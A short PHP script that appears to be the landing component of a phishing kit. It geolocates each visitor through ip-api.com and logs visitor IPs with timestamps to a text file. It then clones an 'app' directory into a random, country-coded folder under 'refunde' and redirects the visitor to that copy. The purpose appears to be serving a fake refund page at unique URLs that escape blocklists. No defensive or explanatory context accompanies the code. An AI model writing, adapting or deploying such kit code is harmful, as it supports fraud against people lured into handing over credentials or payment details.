<?php
session_start();

$ip = getenv("REMOTE_ADDR");
$curl   = curl_init("http://ip-api.com/json/".$ip);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$khres = curl_exec($curl);
$datakh  = json_decode($khres);
$_SESSION['countryxxx']  =  $datakh->country;
$_SESSION['codexxx']  =  $datakh->countryCode;

$ip = getenv("REMOTE_ADDR");
$file = fopen("ip.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
for ($DIR = '', $i = 0, $do_ll = strlen($a = '123456789')-1; $i != 6; $x = rand(0,$do_ll), $DIR .= $a{$x}, $i++);
$_SESSION['_DIR_'] = $DIR;
$DIR = "./refunde/".$_SESSION['codexxx']."-EN".$DIR;
$khkhkhkhkhkhkh="app";
function recurse_copy($khkhkhkhkhkhkh,$DIR) {
$dir = opendir($khkhkhkhkhkhkh);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($khkhkhkhkhkhkh . '/' . $file) ) {
recurse_copy($khkhkhkhkhkhkh . '/' . $file,$DIR . '/' . $file);
}
else {
copy($khkhkhkhkhkhkh . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
recurse_copy( $khkhkhkhkhkhkh, $DIR );
header("Location: $DIR");

?>